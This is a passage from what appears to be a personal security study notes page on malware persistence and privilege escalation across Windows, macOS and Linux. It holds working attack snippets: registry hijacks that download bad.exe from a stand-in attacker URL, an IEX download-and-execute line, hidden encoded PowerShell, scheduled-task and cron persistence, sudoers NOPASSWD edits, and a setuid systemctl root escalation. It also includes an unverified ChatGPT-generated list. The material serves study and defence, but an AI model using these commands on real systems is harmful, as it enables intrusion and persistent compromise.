</span></span><span class="line"><span class="cl">&gt;3. The 16-bit system directory. No <span class="k">function</span> obtains the path of this directory, but it is searched.
</span></span><span class="line"><span class="cl">&gt;4. The Windows directory. Use the <span class="o">[</span>**GetWindowsDirectory**<span class="o">](</span>https://learn.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya<span class="o">)</span> <span class="k">function</span> to get the path of this directory.
</span></span><span class="line"><span class="cl">**&gt;5. The current directory.**
</span></span><span class="line"><span class="cl">&gt;6. The directories are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
</span></span><span class="line"><span class="cl">&gt;
</span></span><span class="line"><span class="cl">&gt; If **SafeDllSearchMode** is disabled ⛔️, the search order is as follows:
</span></span><span class="line"><span class="cl">&gt; 1. The directory from which the application loaded.
</span></span><span class="line"><span class="cl">**&gt; 2. The current directory.**
</span></span><span class="line"><span class="cl">&gt; 3. The system directory. Use the <span class="o">[</span>**GetSystemDirectory**<span class="o">](</span>https://learn.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya<span class="o">)</span> <span class="k">function</span> to get the path of this directory.
</span></span><span class="line"><span class="cl">&gt; 4. The 16-bit system directory. No <span class="k">function</span> obtains the path of this directory, but it is searched.
</span></span><span class="line"><span class="cl">&gt; 5. The Windows directory. Use the <span class="o">[</span>**GetWindowsDirectory**<span class="o">](</span>https://learn.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya<span class="o">)</span> <span class="k">function</span> to get the path of this directory.
</span></span><span class="line"><span class="cl">&gt; 6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Side-by-side loading <span class="o">(</span>SxS<span class="o">)</span> mechanism to introduce updated versions of DLL. It can be used to circumvent anti-virus. Example: PlugX RAT. Legitimately signed <span class="sb">`</span>exe<span class="sb">`</span> uses SxS to load a malicious <span class="sb">`</span>dll<span class="sb">`</span>. The attacker puts a nefarious <span class="sb">`</span>dll<span class="sb">`</span> somewhere down the road to make sure it<span class="s1">&#39;s loaded instead of the legitimate one.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">📚 **References**: Read more [here](https://businessinsights.bitdefender.com/tech-explainer-what-is-dll-sideloading). 
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">#### Phantom DLL hijacking
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">An executable is trying to load a very old `dll`, even though it&#39;</span>s superfluous. Some of them don<span class="err">&#39;</span>t even exist anymore, <span class="k">for</span> example, <span class="sb">`</span>fxsst.dll<span class="sb">`</span>. The attacker just creates a dll with the same name and some nefarious functionality.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### macOS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#### Dylibs Environment Variables</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="sb">```</span>bash
</span></span><span class="line"><span class="cl">DYLD_*
</span></span><span class="line"><span class="cl">DYLD_INSERT_LIBRARIES <span class="c1"># all libs from this env will be loaded</span>
</span></span><span class="line"><span class="cl">DYLD_FRAMEWORK_PATH
</span></span></code></pre></div><p>These libraries are loaded within a trusted host process, not resulting in a new process.</p>
<p>A <code>plist</code> for launch item - <code>EnvironmentVariables</code>. For application - <code>LSEnvironment</code> (<code>Info.plist</code>).</p>
<h4 id="proxying">Proxying</h4>
<h4 id="hijacking">Hijacking</h4>
<h2 id="tasks">Tasks</h2>
<h3 id="windows-3">Windows</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C: <span class="se">\W</span>indows<span class="se">\ </span>Tasks<span class="se">\ \*</span>.job
</span></span><span class="line"><span class="cl">C: <span class="se">\W</span>indows<span class="se">\S</span>chedLgU.txt
</span></span><span class="line"><span class="cl">C: <span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\T</span>asks
</span></span></code></pre></div><p><code>at.exe</code> (deprecated but can still be used) and <code>schtasks.exe</code>. For <code>at</code> see <code>at*.job</code> and <code>Schdlgu.txt</code> and Task Scheduler and Security Logs for the second one. WinXP: at jobs run with SYSTEM privileges. Files are created here: <code>\Windows\Tasks</code> and <code>\Windows\System32\Tasks</code> (xml duplicate Win7+). Created with: <code>at.exe 22:22:22 C:\mal.exe</code> or <code>schtasks.exe /create /sc daily /tn winsvchost /tr C:\mal.exe</code>.</p>
<h4 id="-rtfm">📕 RTFM</h4>
<p>An attempt to be stealthy.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-W</span> <span class="n">Hidden</span> <span class="n">-nop</span> <span class="n">-noni</span> <span class="n">-ec</span> <span class="p">&lt;</span><span class="n">base64somthing</span><span class="p">&gt;</span> <span class="c"># The output of this command won&#39;t show a PowerShell window and the output as well. The script to execute is base64 encoded.</span>
</span></span><span class="line"><span class="cl"><span class="c"># W WindowStyle = Hidden</span>
</span></span><span class="line"><span class="cl"><span class="c"># nop NoProfile Does not load PS profile</span>
</span></span><span class="line"><span class="cl"><span class="c"># noni NonINteractive - no interactive prompt to the user presented</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># a popular string to download stuff from the Internet</span>
</span></span><span class="line"><span class="cl"><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://somethingmalicious.com/file&#39;</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="linux-2">Linux</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/cron*  
</span></span><span class="line"><span class="cl">/var/spool/crontabs 
</span></span><span class="line"><span class="cl">/var/spool/atjobs  
</span></span><span class="line"><span class="cl">/etc/anacron
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"></code></pre></div><h3 id="macos-2">macOS</h3>
<h4 id="cron">Cron</h4>
<p><code>/usr/bin/crontab</code>
Post-exploitation RT tool EmPyre has a module to exploit this technique.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">cmd</span> <span class="o">=</span> <span class="s1">&#39;crontab -l | { cat; echo &#34;0 * * * * %s&#34;; } | crontab -&#39;</span>subprocess.Popen<span class="o">(</span>cmd, <span class="nv">shell</span><span class="o">=</span>True, <span class="nv">stdout</span><span class="o">=</span>subprocess.PIPE<span class="o">)</span>.stdout.read<span class="o">()</span>
</span></span></code></pre></div><p>The <code>cat</code> and <code>echo</code> commands append the new command. The <code>%s</code> in the cmd variable will be updated at runtime with the path of the item to persist, and the<code> 0 * * * *</code> component instructs macOS to execute the job every hour.
The <code>crontab -</code> will reinstall any existing jobs, along with the new one.</p>
<h4 id="at">At</h4>
<p><code>/private/var/at/jobs/</code> directory and enumerate them via the <code>/usr/bin/atq</code> utility.</p>
<blockquote>
<p>❗️ On a default install of macOS, the <code>at</code> scheduler, <code>/usr/libexec/atrun</code>, is disabled. However, malware can enable it with 👑 root privileges with the following command: <code>launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist</code>.</p>
</blockquote>
<p>After enabling this scheduler, malware can create an at job by simply piping persistent commands into /usr/bin/at, specifying the time and date of execution.</p>
<p>Not a popular technique.</p>
<h4 id="periodic">Periodic</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/periodic
</span></span></code></pre></div><p>Though this directory is owned by root, malware with adequate privileges may be able to create (or subvert) a periodic script in order to achieve persistence at regular intervals. &ldquo;What is the difference between &lsquo;periodic&rsquo; and &lsquo;cron&rsquo; on OS X?&rdquo; <a href="https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/">https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/</a></p>
<h4 id="login-and-logout-hooks">Login and Logout Hooks</h4>
<p>Look for either LoginHook or LogoutHook in the following plist:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">~/Library/Preferences/com.apple.loginwindow.plist
</span></span></code></pre></div><h4 id="-rtfm-1">📕 RTFM</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">export</span> <span class="nv">FILENAME</span><span class="o">=</span><span class="k">$(</span>date +<span class="s2">&#34;%s&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">METADATA_TOKEN</span><span class="o">=</span><span class="k">$(</span>curl -s -X PUT -H <span class="s1">&#39;X-aws-ec2-metadata-token-ttl-seconds: 120&#39;</span> http://169.254.169.254/latest/api/token<span class="k">)</span> <span class="nb">export</span> <span class="nv">AWS_REGION</span><span class="o">=</span><span class="k">$(</span>curl -s -H <span class="s2">&#34;X-aws-ec2-metadata-token: </span><span class="nv">$METADATA_TOKEN</span><span class="s2">&#34;</span> http://169.254.169.254/latest/dynamic/instance-identity/ document <span class="p">|</span> jq -r <span class="s1">&#39;.region&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">DB_SECRETS</span><span class="o">=</span><span class="k">$(</span>aws secretsmanager get-secret-value --secret-id <span class="k">$(</span>unique_string<span class="k">)</span>/database --region <span class="nv">$AWS_REGION</span> <span class="p">|</span> jq -r <span class="s1">&#39;.SecretString&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">DB_USERNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$DB_SECRETS</span> <span class="p">|</span> jq -r <span class="s1">&#39;.username&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">DB_NAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$DB_SECRETS</span> <span class="p">|</span> jq -r <span class="s1">&#39;.name&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">DB_HOST</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$DB_SECRETS</span> <span class="p">|</span> jq -r <span class="s1">&#39;.endpoint&#39;</span> <span class="p">|</span> cut -d: -f1<span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">DB_PASSWORD</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$DB_SECRETS</span> <span class="p">|</span> jq -r <span class="s1">&#39;.password&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">MYSQL_PWD</span><span class="o">=</span><span class="nv">$DB_PASSWORD</span> mysqldump --databases <span class="nv">$DB_NAME</span> --tables users -u <span class="nv">$DB_USERNAME</span> -h <span class="nv">$DB_HOST</span> &gt; /tmp/<span class="nv">$FILENAME</span>.sql
</span></span><span class="line"><span class="cl">aws kms encrypt --key-id alias/backup-<span class="k">$(</span>unique_string<span class="k">)</span> --plaintext fileb:///tmp/<span class="nv">$FILENAME</span>.sql --region <span class="nv">$AWS_REGION</span> <span class="p">|</span> jq -r <span class="s1">&#39;.CiphertextBlob&#39;</span> &gt; /tmp/<span class="nv">$FILENAME</span>.sql.enc
</span></span><span class="line"><span class="cl">aws s3 cp /tmp/<span class="nv">$FILENAME</span>.sql.enc s3://sec510-backup-<span class="k">$(</span>unique_string<span class="k">)</span>
</span></span><span class="line"><span class="cl">rm /tmp/<span class="nv">$FILENAME</span>.sql*
</span></span></code></pre></div><h2 id="policies">Policies</h2>
<h3 id="windows-4">Windows</h3>
<p>More about it <a href="https://www.tenforums.com/tutorials/87919-enable-data-persistence-microsoft-edge-application-guard.html#option1">here</a>. This could be used to allow some legit software.</p>
<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> (when specified in the policy settings)</p>
<ul>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> (when specified in the policy settings)</li>
</ul>
<h2 id="office">Office</h2>
<p>📚 <strong>References</strong>: More <a href="https://pentestlab.blog/2019/12/11/persistence-office-application-startup/">here</a>.</p>
<h2 id="ipc">IPC</h2>
<h3 id="windows-5">Windows</h3>
<h4 id="shell-extension-handlers">Shell Extension Handlers</h4>
<p><code>Computer\HKCU\Software\Classes\*\shellex\ContextMenuHandlers</code>. Same under <code>HKLM</code>. ⚠️ No need to provide admin creds to add a value here, to <code>HKCU</code> only. GUID here is the same as listed in <code>CLSID</code> subkey.  To add a malicious extension one needs to create a unique GUID, add a subkey to CLSID, <code>add</code> a path to <code>dll</code>, and then add a shell extension in the registry above using the same GUID. Use 🛠 OLE/COM object Viewer to see all COM objects registered. Simply clicking an image or a archive file may trigger a malicious act.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Path</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\*\shellex\ContectMenuHandlers\BadExt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Name</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Value</span><span class="p">=</span><span class="s2">&#34;{GUID}&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$Path1</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32&#34;</span> <span class="c"># example</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Name1</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Value1</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\bad.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path1</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path1</span> <span class="n">-Name</span> <span class="nv">$Name1</span> <span class="n">-Value</span> <span class="nv">$Value1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>	
</span></span></code></pre></div><h4 id="com-hijack">COM Hijack</h4>
<p>In Process Monitor filter: <em>Path contains CLSID</em> and <em>Result is NAME NOT FOUND</em>. The entry exists in <code>HKLM\Software\Classes\CLSID\{GUID}</code>, but doesn&rsquo;t exist at <code>HKCU\Software\Classes\CLSID\{GUID}</code>. It looks for the entry in HKCU first, if not found, in HKLM. That&rsquo;s where we can add an entry under HKCU. Powershell needs to be used, since it&rsquo;s a trusted application for registry.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Path1</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32&#34;</span> <span class="c"># example</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Name1</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Value1</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\bad.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>	
</span></span></code></pre></div><h4 id="extension-handler-hijacking">Extension Handler Hijacking</h4>
<p><code>Computer\HKCR\</code>, subkeys <code>Open</code> and <code>Command</code>. An attackere can&rsquo;t change HKCR or HKLM, but can change <code>HKCU</code> and <code>HKU</code> without admin privileges. Using a proxy within <code>Command</code> will help remain low: <code>proxy.exe &quot;{path/to/real/app}&quot;</code> (starts the meterpreter, for example, then launches the real appliation). ⚠️ Powershell is not necessary, HKU hive can be edited without it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">-PSProvider</span> <span class="n">Registry</span> <span class="n">-Name</span> <span class="n">HKU</span> <span class="n">-Root</span> <span class="n">HKEY_USERS</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Path</span><span class="p">=</span><span class="s2">&#34;HKU:\{SID}_Classes\VLC.mp4\shell\Open\Command&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Name</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Value</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>
</span></span></code></pre></div><p>Read more about the above techniques: <a href="https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394">Wipe the drive! Stealthy Malware Persistence - Part 1</a> and <a href="https://isc.sans.edu/forums/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Part+2/15406/">Wipe the drive! Stealthy Malware Persistence - Part 2</a>.</p>
<h2 id="elevation-control-mechanism-abuse">Elevation Control Mechanism Abuse</h2>
<h3 id="linux--macos">Linux &amp; macOS</h3>
<h4 id="setuid-and-setgid"><code>setuid</code> and <code>setgid</code></h4>
<p><strong>Platforms</strong>: macOS, Linux
<strong>MITRE</strong>: <a href="https://attack.mitre.org/techniques/T1548/001/">https://attack.mitre.org/techniques/T1548/001/</a></p>
<p><code>setuid</code> or <code>setgid</code> bits set in UNIX. <code>chmod u+s [file]</code> or <code>chmod 4777 [file]</code> to set the bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used. Look for the files with the bit set: <code>find / -perm +4000 2&gt;/dev/null</code> and <code>find / -perm +2000 2&gt;/dev/null</code> for the <code>segid</code>.</p>
<p>When a user runs an executable file with the setuid bit set, the real user ID (RUID) of the process is set to the user ID of the user who ran the file, while the effective user ID (EUID) is set to the user ID of the file owner. This means that the process runs with the privileges of the file owner while still retaining the identity of the user who executed the file.</p>
<p>One of the files with this bit set is <strong>systemctl</strong>. This process is used to start services, for example, an apache server: <code>sudo systemctl start apache2</code>. However, if this file is assigned SUID permissions by mistake, it can be used for privilege escalation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">eop</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service <span class="c1"># create a temp file with a random unique name and store the name in a eop variable</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[Service]
</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; ExecStart=/bin/sh -c &#34;cat /root/root.txt &gt; /tmp/output&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; [Install]
</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$eop</span> <span class="c1"># write the config for the service into the file. This unit file will be used by the systemctl to run the process specified in the ExecStart variable. </span>
</span></span><span class="line"><span class="cl"><span class="c1"># ❗️ Do not copy this code in whole, line by line without the &gt; sign, or else you will not get it work</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ❗️ I have added touch $eop but it&#39;s not required (it was in my case, cause I had an error)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/bin/systemctl link <span class="nv">$eop</span> <span class="c1"># This command in Linux creates a symbolic link for the service file specified in the &#34;$eop&#34; environment variable, in the &#34;/etc/systemd/system/&#34; directory, using the systemctl utility. The link created allows the service to be managed with systemctl commands.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$eop</span> <span class="c1"># This command in Linux enables and starts the service specified in the &#34;$eop&#34; environment variable, using the systemctl utility. The &#34;enable&#34; option makes the service to start at boot time, while the &#34;--now&#34; option starts the service immediately after the command is executed.</span>
</span></span></code></pre></div><p>Below is the list generated by ChatGTP (to validate) that shows other executables with this bit set that are potentially useful to the attacker:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/passwd: Used to change user passwords. A vulnerability in this file could allow an attacker to gain root privileges.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/usr/bin/chsh: Used to change a user<span class="s1">&#39;s default shell. A vulnerability in this file could allow an attacker to gain root privileges.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/usr/bin/chfn: Used to change a user&#39;</span>s finger information. A vulnerability in this file could allow an attacker to gain root privileges.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/usr/bin/sudo: Used to run commands as another user, typically root. A vulnerability in this file could allow an attacker to gain root privileges.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/usr/bin/sudoedit: Used to edit files as another user, typically root. A vulnerability in this file could allow an attacker to gain root privileges.
</span></span></code></pre></div><p><strong>Mitigation</strong>: Don&rsquo;t set this bit on binaries with known shell escape vulnerabilities.</p>
<h4 id="sudo-caching">Sudo caching</h4>
<p><strong>Platforms</strong>: macOS, Linux
<strong>MITRE:</strong> <a href="https://attack.mitre.org/techniques/T1548/003/">https://attack.mitre.org/techniques/T1548/003/</a></p>
<p>One can add <code>admin ALL=(ALL) NOPASSWD: ALL</code> to the <code>/etc/sudoers</code> file.
Also, malware might monitor <code>/var/db/sudo</code> file for the timestamp and execurte when possible.
Also, it&rsquo;s possible to disable terminal windows isolation, like this: <code>echo \'Defaults !tty_tickets\' &gt;&gt; /etc/sudoers</code>.</p>
<h4 id="authorizationexecutewithprivileges"><code>AuthorizationExecuteWithPrivileges</code></h4>
<p><strong>Platforms</strong>: macOS
<strong>MITRE</strong>: <a href="https://attack.mitre.org/techniques/T1548/004/">https://attack.mitre.org/techniques/T1548/004/</a></p>
<p><code>AuthorizationExecuteWithPrivileges</code> API (macOS). Set the preferences to block all programs not downloaded from AppStore. Basically, it brings a prompt and asks the user to grant the permissions. The trick is to be convincing enought so that the user grants the permissions.</p>
<p><strong>Mitigations</strong>: least privilege, proper configuration, defense in-depth, zero trust.</p>
<p><strong>Writeups</strong> 📚:</p>
<ul>
<li><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49">https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49</a></li>
<li><a href="https://n0w4n.nl/vulnversity/">https://n0w4n.nl/vulnversity/</a></li>
</ul>
<h3 id="windows-6">Windows</h3>
<h4 id="uac-abuse">UAC Abuse</h4>
<p><strong>Platforms</strong>: Windows
<strong>MITRE</strong>: <a href="https://attack.mitre.org/techniques/T1548/002/">https://attack.mitre.org/techniques/T1548/002/</a></p>
<p>Abusing UAC on Windows.</p>
<h2 id="tokens">Tokens</h2>
<p><strong>MITRE</strong>: <a href="https://attack.mitre.org/techniques/T1134/001/">https://attack.mitre.org/techniques/T1134/001/</a>, <a href="https://attack.mitre.org/techniques/T1134/">https://attack.mitre.org/techniques/T1134/</a>, <a href="https://attack.mitre.org/techniques/T1134/002/">https://attack.mitre.org/techniques/T1134/002/</a>, <a href="https://attack.mitre.org/techniques/T1134/003/">https://attack.mitre.org/techniques/T1134/003/</a>, <a href="https://attack.mitre.org/techniques/T1134/004/">https://attack.mitre.org/techniques/T1134/004/</a>, <a href="https://attack.mitre.org/techniques/T1134/005/">https://attack.mitre.org/techniques/T1134/005/</a>
<strong>Actors</strong>: <a href="https://attack.mitre.org/groups/G0032/">https://attack.mitre.org/groups/G0032/</a></p>
<p><strong>Techniques:</strong></p>
<ul>
<li>Token impersonalisation.</li>
<li><code>runas</code> or <code>CreateProcessWithTokenW</code> to create a process with the rights of another user.</li>
<li>spoof parent process ID</li>
<li>Windows. SID-history injection. By injecting a fake SID into the SID history of a user account, an attacker can create a new identity with additional access rights without raising any alarms. 🚨 Need elevated privileges. The SID history is stored in the user object&rsquo;s attribute in the AD database. The attribute is named &ldquo;SIDHistory&rdquo; and can be viewed and modified using the Active Directory Users and Computers (ADUC) management console or other AD management tools.</li>
</ul>
<h2 id="kernel-modules-and-extentions">Kernel Modules and Extentions</h2>
<h3 id="linux-3">Linux</h3>
<h4 id="lkm">LKM</h4>
<p>LKM for Linux. Drivers are one type of kernel extentions.</p>
<h4 id="xdg">XDG</h4>
<p><a href="https://attack.mitre.org/techniques/T1547/013/">https://attack.mitre.org/techniques/T1547/013/</a></p>
<h3 id="macos-3">macOS</h3>
<h4 id="kext">kext</h4>
<p><code>kext</code> for macOS. <code>kextload</code> and <code>kextunload</code>. These need to be signed with a cert approved by Apple. Otherwise, to launch the app one needs to disable SIP. That&rsquo;s probably the reason why the RAM cannot be dumped on macOS with SIP enabled. Replaced by System Extentions but still can be used.</p>
<h4 id="reopen">reopen</h4>
<p>Remember the &ldquo;Reopen windows when logging back in&rdquo; prompt on macOS? When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory. Applications listed in this file are automatically reopened upon the user’s next logon.</p>
<h3 id="windows-7">Windows</h3>
<h4 id="lsass-driver">LSASS driver</h4>
<h4 id="shortcuts">Shortcuts</h4>
<p>Abuse shortcuts in the startup folder to execute their tools and achieve persistence</p>
<h4 id="port-monitors">Port Monitors</h4>
<ol>
<li><code>AddMonitor</code> API call. <code>spoolsv.exe</code> runs under SYSTEM privileges.</li>
<li><code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code> (option #2)
<ol>
<li>Local Port</li>
<li>Standard TCP/IP Port</li>
<li>USB Monitor</li>
<li>WSD Port</li>
</ol>
</li>
</ol>
<h4 id="print-processors">Print Processors</h4>
<p>Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe (SYSTEM permissions, during boot.</p>
<ol>
<li><code>AddPrintProcessor</code> for account with <code>SeLoadDriverPrivilege</code> flag set.</li>
<li>adding the <code>HKLM\SYSTEM\[CurrentControlSet or ControlSet001]\Control\Print\Environments\[Windows architecture: e.g., Windows x64]\Print Processors\[user defined]\Driver</code> Registry key that points to the DLL.</li>
</ol>
<h2 id="references">References</h2>
<details>
    <summary>Expand&hellip;</summary>
    <h3 id="macos">macOS</h3>
